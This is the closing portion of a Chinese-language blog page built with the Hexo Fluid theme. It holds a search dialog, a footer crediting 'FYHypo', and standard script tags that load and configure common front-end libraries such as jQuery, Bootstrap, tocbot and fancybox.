      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a target="_blank" rel="nofollow noopener"><span>FYHypo</span></a> <i class="iconfont icon-love"></i> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/custom.js"></script>
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/Cherry.min.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
